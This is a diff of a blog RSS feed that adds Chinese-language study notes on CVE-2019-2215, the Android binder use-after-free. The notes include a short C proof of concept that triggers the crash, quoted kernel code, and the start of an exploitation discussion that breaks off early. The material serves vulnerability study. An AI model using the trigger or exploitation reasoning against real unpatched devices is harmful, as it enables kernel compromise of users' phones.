@@ -6,10 +6,1387 @@
     <description>Recent content in Linux on ExiaHan&#39;s Blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Wed, 01 Aug 2018 22:18:20 +0800</lastBuildDate>
+    <lastBuildDate>Tue, 23 Jun 2020 00:42:00 +0800</lastBuildDate>
     
 	<atom:link href="https://blog.exiahan.com/tags/linux/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>CVE 2019 2215 Study Notes</title>
+      <link>https://blog.exiahan.com/cve-2019-2215_study_notes/</link>
+      <pubDate>Tue, 23 Jun 2020 00:42:00 +0800</pubDate>
+      
+      <guid>https://blog.exiahan.com/cve-2019-2215_study_notes/</guid>
+      <description>&lt;p&gt;最近有了点时间，好好看了下CVE-2019-2215的漏洞利用细节，这里记录下来，一方面留着以后再看方便，一方面把自己的理解写出来也是学习的一种方式。&lt;/p&gt;
+&lt;p&gt;这里问我写的内容可以看成是对Google Project Zero的文章的翻译加上一些个人想法，不过还是推荐看看原文，链接在&lt;a href=&#34;https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html&#34;&gt;这里&lt;/a&gt;, 因为看的其他的多多少少都有点模糊的地方,没有P0的文章说的详细，这也是我想自己写一个分析的原因。&lt;/p&gt;
+&lt;h2 id=&#34;1-root-cause&#34;&gt;1. Root Cause&lt;/h2&gt;
+&lt;p&gt;通过阅读对应的&lt;a href=&#34;https://bugs.chromium.org/p/project-zero/issues/detail?id=1942&#34;&gt;issue page&lt;/a&gt;和
+根据对应的内核&lt;a href=&#34;https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/drivers/android/binder.c?h=linux-4.14.y&amp;amp;id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b&#34;&gt;Patch&lt;/a&gt;(需要注意commit里的内容不太准确),
+造成CVE-2019-2215的根本原因在于binder driver内部在收到&lt;code&gt;BINDER_THREAD_EXIT&lt;/code&gt;的ioctl后，负责释放对应binder_thread的函数在free binder_thread前没有检查当前binder_thread 是否在epoll中存在引用，从而导致在epoll中存在引用的binder_thread在被释放后依然在epoll中存在一个悬挂指针。当后面epoll因为一些原因尝试删除该已经被释放的binder_thread内部指向的一个waitqueue时出现未定义行为，如Crash(&lt;em&gt;当被free的binder_thread所在的内存已经被分配给其他对象复写破坏时&lt;/em&gt;)&lt;/p&gt;
+&lt;p&gt;利用下面的poc可以在开了KASAN的对应kernel上触发crash&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;16
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;17
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;sys/epoll.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;sys/ioctl.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#define BINDER_THREAD_EXIT 0x40046208ul
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;()
+{
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; fd, epfd;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;epoll_event&lt;/span&gt; event &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; { .events &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; EPOLLIN };
+
+        fd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/dev/binder0&amp;#34;&lt;/span&gt;, O_RDONLY);
+        epfd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; epoll_create(&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;);
+        epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;event);
+        ioctl(fd, BINDER_THREAD_EXIT, NULL);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;整个触发时间过程如下图：
+&lt;img src=&#34;https://blog.exiahan.com/images/cve20192215/crashTimeline.jpg&#34; alt=&#34;binder poll crash&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到首先通过&lt;code&gt;ioctl&lt;/code&gt; 释放binder_thread, 然后程序退出，触发epoll的waitqueue删除操作，从而触发crash。在没打补丁且开了KASAN的对应虚拟机上尝试，可以得到如下的call stack。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://blog.exiahan.com/images/cve20192215/kasan.jpg&#34; alt=&#34;kasan&#34;&gt;&lt;/p&gt;
+&lt;p&gt;从这里就能看到Crash是在remove_wait_queue里面被触发，因为
+&lt;a href=&#34;https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/fs/eventpoll.c?h=linux-4.14.y&amp;amp;id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b&#34;&gt;&lt;code&gt;ep_remove_wait_queue&lt;/code&gt;&lt;/a&gt;调用了&lt;a href=&#34;https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/kernel/sched/wait.c?h=linux-4.14.y&amp;amp;id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b&#34;&gt;&lt;code&gt;remove_wait_queue&lt;/code&gt;&lt;/a&gt;， 而&lt;code&gt;remove_wait_queue&lt;/code&gt;里面调用了&lt;a href=&#34;https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/include/linux/spinlock.h?h=linux-4.14.y&amp;amp;id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b&#34;&gt;&lt;code&gt;spin_lock_irqsave&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;16
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;17
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;18
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;19
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;20
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;21
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;22
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;23
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;24
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;25
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;26
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ep_remove_wait_queue&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;eppoll_entry&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;pwq)
+{
+        wait_queue_head_t &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;whead;
+
+        rcu_read_lock();
+        &lt;span style=&#34;color:#75715e&#34;&gt;/*
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;        * If it is cleared by POLLFREE, it should be rcu-safe.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;        * If we read NULL we need a barrier paired with
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;        * smp_store_release() in ep_poll_callback(), otherwise
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;        * we rely on whead-&amp;gt;lock.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;        */&lt;/span&gt;
+        whead &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; smp_load_acquire(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;pwq&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;whead);
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (whead)
+                remove_wait_queue(whead, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;pwq&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;wait);
+        rcu_read_unlock();
+}
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;remove_wait_queue&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;wait_queue_head&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;wq_head, &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;wait_queue_entry&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;wq_entry)
+{
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; flags;
+
+        spin_lock_irqsave(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;wq_head&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;lock, flags);
+        __remove_wait_queue(wq_head, wq_entry);
+        spin_unlock_irqrestore(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;wq_head&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;lock, flags);
+}
+EXPORT_SYMBOL(remove_wait_queue);
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blog.exiahan.com/images/cve20192215/logWithPrintk.jpg&#34; alt=&#34;log with printk&#34;&gt;&lt;/p&gt;
+&lt;p&gt;通过分析crash时的log(这里我自己加了printk在binder_thread和ep_remove_wait_queue里面)，可以看到Crash时候的binder_thread object的地址是&lt;code&gt;0xffff888046070008&lt;/code&gt;，同时在Crash之前的最后一个被释放的&lt;code&gt;eppoll_entry&lt;/code&gt;的地址是&lt;code&gt;0xffff88803ab6e6a8&lt;/code&gt;。 为了验证binder_thread object对应的fd被加到epoll中后两者的对应关系，我们使用kgdb调试一下kernel，这里具体怎么编译调试的kernel不具体展开，直接看调试打印的变量信息。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://blog.exiahan.com/images/cve20192215/kgdbInfo.jpg&#34; alt=&#34;kgdb info&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到上面crash log里面&lt;code&gt;eppoll_entry.whead&lt;/code&gt;刚好就是&lt;code&gt;binder_thread.wait&lt;/code&gt;，所以现在可以确定这里&lt;code&gt;ep_remove_wait_queue&lt;/code&gt;的&lt;code&gt;whead&lt;/code&gt;变量，即&lt;code&gt;remove_wait_queue&lt;/code&gt;的参数&lt;code&gt;wq_head&lt;/code&gt;就是已经是被释放的binder_thread里的wait，所以当引用&lt;code&gt;wait-&amp;gt;lock&lt;/code&gt;时指向了一段已经被free的内存，从而在&lt;code&gt;spin_lock_irqsave&lt;/code&gt;尝试去写&lt;code&gt;wait-&amp;gt;lock&lt;/code&gt;时触发KASAN报错。&lt;/p&gt;
+&lt;p&gt;如果深入检查&lt;code&gt;spin_lock_irqsave&lt;/code&gt;，会发现最终调用了&lt;a href=&#34;https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/include/linux/spinlock_api_smp.h?h=linux-4.14.y&amp;amp;id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b&#34;&gt;&lt;code&gt;_raw_spin_lock_irqsave&lt;/code&gt;&lt;/a&gt;，其反汇编代码如下，可以看到其中做KASAN检查的地方。这里具体不再展开。
+&lt;img src=&#34;https://blog.exiahan.com/images/cve20192215/raw_spin_locl_irqsave_disassembly.jpg&#34; alt=&#34;raw spin lock irqsave&#34;&gt;&lt;/p&gt;
+&lt;p&gt;需要注意的是，如果&lt;code&gt;lock&lt;/code&gt;本身不是0，那么在这里就会hang住，下面的&lt;code&gt;__remove_wait_queue&lt;/code&gt;就无法执行，所以后面在做利用的时候需要做到能&lt;strong&gt;保持&lt;code&gt;binder_thread.wait.lock&lt;/code&gt;的值为0.&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&#34;2-exploit&#34;&gt;2. Exploit&lt;/h2&gt;
+&lt;p&gt;前面在Root Cause里面已经分析过，之所以被KASAN检测到是因为binder_thread 已经被释放，所以wait指向的内存已经被打上KASAN的标记，但是如果KASAN没有开启，epoll的remove流程会继续走下去，最终走到&lt;code&gt;__list_del&lt;/code&gt;。当然，P0的文章里也有提到，如果&lt;code&gt;CONFIG_DEBUG_LIST&lt;/code&gt;开启的话，会走不同的代码块，并且有很多check，所以不会有exploit的机会存在，这里只讨论没有开启该flag的情况。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;16
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;17
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;18
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;19
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;20
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;21
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;inline&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;__remove_wait_queue&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;wait_queue_head&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;wq_head, &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;wait_queue_entry&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;wq_entry)
+{
+        list_del(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;wq_entry&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;entry);
+}
+
+
+&lt;span style=&#34;color:#75715e&#34;&gt;#ifndef CONFIG_DEBUG_LIST
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;...
+&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;inline&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; list_del(&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;list_head&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;entry)
+{
+        __list_del(entry&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;prev, entry&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;next);
+        entry&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;next &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; LIST_POISON1;
+        entry&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;prev &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; LIST_POISON2;
+}
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;inline&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;__list_del&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;list_head&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; prev, &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;list_head&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; next)
+{
+        next&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;prev &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; prev;
+        WRITE_ONCE(prev&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;next, next);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这里最开始的&lt;code&gt;old&lt;/code&gt;就是&lt;code&gt;eppoll_entry.wait&lt;/code&gt;，根据代码的解释，即为&lt;code&gt;binder_thread.wait&lt;/code&gt;指向的链表上的一个&lt;strong&gt;item&lt;/strong&gt;。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3
